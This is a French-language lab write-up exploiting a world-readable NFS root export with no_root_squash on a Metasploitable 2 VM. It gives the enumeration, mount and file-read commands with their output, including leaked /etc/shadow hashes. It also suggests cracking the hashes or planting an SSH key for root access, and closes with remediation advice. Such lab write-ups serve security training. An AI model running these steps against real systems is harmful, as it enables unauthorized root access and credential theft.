# Write-up — NFS root export (Metasploitable 2, port 2049)

Cible : `192.168.56.101` (réseau josa `vboxnet0`) · Kali : `192.168.56.1`.
Résultat : **accès root au filesystem de la cible** via export NFS en `no_root_squash`
(lecture de `/etc/shadow`, du home de root, écriture possible).

> Réseau : services de josa sur `vboxnet0` (`192.168.56.0/24`). MS2 = `192.168.56.101`.

**C'est quoi ?** NFS partage des répertoires sur le réseau. Ici la **racine entière (`/`)** est
exportée à **tout le monde**, en lecture/écriture, avec l'option **`no_root_squash`** : le root
d'une machine cliente (notre Kali) est traité comme le **root de la cible**. En montant le
partage, on lit et écrit le filesystem distant avec les droits root — sans aucun exploit ni
mot de passe.

---

## 1. Recon — énumération RPC puis NFS (rpcbind, port 111)

NFS s'appuie sur le portmapper RPC (port 111). On l'interroge pour cartographier les services
RPC et leurs ports réels (souvent dynamiques) :

```bash
rpcinfo -p 192.168.56.101
```
```
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100003    2,3,4 tcp 2049  nfs
    100005    1,2,3 tcp 41969 mountd      <- port dynamique, révélé par rpcbind
    100021   1,3,4 tcp 50825  nlockmgr
    100024    1   tcp  37243  status
```

`nfs` (100003) est bien présent sur 2049. On liste les exports :

```bash
showmount -e 192.168.56.101
```
```
Export list for 192.168.56.101:
/ *
```

**`/ *`** : la racine est exportée à **toutes** les adresses (`*`). C'est la mauvaise
configuration à exploiter.

## 2. Montage du partage depuis Kali

Le montage NFS nécessite les droits root **locaux** (sur Kali) :

```bash
mkdir -p /tmp/nfs_ms2
sudo mount -t nfs -o vers=3 192.168.56.101:/ /tmp/nfs_ms2
mount | grep nfs_ms2
```
```
192.168.56.101:/ on /tmp/nfs_ms2 type nfs (rw,relatime,vers=3,...,addr=192.168.56.101)
```

Montage réussi en lecture/écriture.

## 3. Exploitation — no_root_squash

Comme notre root local est mappé sur le root distant, on lit des fichiers normalement réservés
à root sur la cible :

```bash
sudo head -5 /tmp/nfs_ms2/etc/shadow
```
```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
```

**On lit `/etc/shadow`** (fichier `root:shadow`, interdit à tout utilisateur normal) : les
empreintes de mots de passe root sont exposées → cassables hors ligne (`john`/`hashcat`).

Le home de root est également accessible :
```bash
sudo ls -la /tmp/nfs_ms2/root
```
```
drwxr-xr-x 13 root root  ... .
lrwxrwxrwx  1 root root  ... .bash_history -> /dev/null
drwx------  2 root root  ... .ssh
-rwx------  1 root root  ... reset_logs.sh
-rw-------  1 root root  ... .rhosts
...
```

## 4. Preuve d'accès

- Montage NFS `rw` de `192.168.56.101:/` réussi.
- Lecture de `/etc/shadow` de la cible (hash root `root:$1$/avpfBJ1$...`) → preuve que notre
  root local accède au filesystem distant **en root** (`no_root_squash`).
- Accès complet au home de root (`.ssh`, `.rhosts`...).

À partir de là, l'accès root complet est trivial : soit casser le hash root récupéré, soit
**déposer une clé publique dans `/tmp/nfs_ms2/root/.ssh/authorized_keys`** et se connecter en
SSH root sans mot de passe. La lecture de `/etc/shadow` suffit déjà à prouver la compromission.

## 5. Remédiation (résumé)

Ne jamais exporter `/` ; limiter les exports au strict nécessaire, à des hôtes nommés (pas
`*`), en `ro` si possible et **toujours avec `root_squash`** (le défaut sûr). Filtrer
l'accès RPC/NFS (ports 111/2049) au pare-feu.

---

**Pour rejouer :** étapes 1→3, `sudo umount /tmp/nfs_ms2` pour finir.
